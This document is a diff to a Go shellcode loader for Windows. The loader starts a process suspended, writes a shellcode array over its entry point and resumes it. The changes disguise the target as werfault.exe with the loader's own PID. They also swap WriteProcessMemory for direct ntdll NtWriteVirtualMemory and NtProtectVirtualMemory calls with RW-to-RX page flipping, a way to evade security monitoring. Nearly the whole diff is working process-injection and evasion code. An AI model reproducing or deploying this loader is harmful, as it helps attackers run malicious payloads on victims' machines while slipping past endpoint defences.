@@ -5,6 +5,8 @@ import (
 	"encoding/binary"
 	"fmt"
 	"golang.org/x/sys/windows"
+	"os"
+	"strconv"
 	"syscall"
 	"unsafe"
 )
@@ -104,7 +106,8 @@ var shellcode = []byte{
 
 
 func main(){
-	cmdline := "c:\\windows\\system32\\notepad.exe"
+	cmdline := "c:\\windows\\system32\\werfault.exe -u -p " + strconv.Itoa(os.Getpid())
+	fmt.Println(cmdline)
 	cmd := syscall.StringToUTF16Ptr(cmdline)
 	var si windows.StartupInfo
 	var pi windows.ProcessInformation
@@ -153,9 +156,29 @@ func main(){
 	h:= fmt.Sprintf("0x%x", codeEntry)
 	fmt.Println("AddressOfEntryPoint:",h)
 
-	WriteProcessMemory := k32.NewProc("WriteProcessMemory")
+	//WriteProcessMemory := k32.NewProc("WriteProcessMemory")
+	//WriteProcessMemory.Call(uintptr(pi.Process), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
 
-	WriteProcessMemory.Call(uintptr(pi.Process), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
+	NTWVM := syscall.NewLazyDLL("ntdll").NewProc("NtWriteVirtualMemory")
+	NtProtectVirtualMemory := syscall.NewLazyDLL("ntdll").NewProc("NtProtectVirtualMemory")
+	var old uintptr
+	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),syscall.PAGE_READWRITE,&old)
+
+	NTWVM.Call(uintptr(pi.Process),codeEntry,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),0)
+
+	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),syscall.PAGE_EXECUTE_READ,&old)
+
 	windows.ResumeThread(pi.Thread)
 
+}
+
+func NtProtect(NtProtectVirtualMemory *syscall.LazyProc,pHndl uintptr,targetPtr uintptr, sSize uintptr,protect uintptr,oldProtect *uintptr)(uintptr,uintptr,error){
+	r1,r2,lastErr := NtProtectVirtualMemory.Call(
+		pHndl,
+		uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&targetPtr)))),
+		uintptr((unsafe.Pointer(&sSize))),
+		protect,
+		uintptr((unsafe.Pointer(oldProtect))),
+	)
+	return r1,r2,lastErr
 }
